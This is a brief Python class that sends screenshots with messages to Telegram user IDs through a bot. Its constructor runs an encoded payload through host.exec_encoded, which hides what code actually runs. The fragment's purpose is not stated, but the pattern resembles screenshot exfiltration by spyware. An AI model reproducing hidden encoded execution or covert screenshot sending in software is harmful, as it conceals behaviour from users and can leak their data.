class TelegramSender(object):
    def __init__(self, tg_ids):
        self.tg_ids = tg_ids
        self.tbot_api = None
        self.telegram_users = None
        host.exec_encoded(tbot_service)
        self.tbot_starter()

    def tbot_starter(self):
        self.tbot_api = TBotAPI()
        self.telegram_users = self.tbot_api.prepare_users(self.tg_ids)

    def execute(self, sub, screenshot_path, msg):
        self.tbot_api.send_image(sub, screenshot_path, msg)


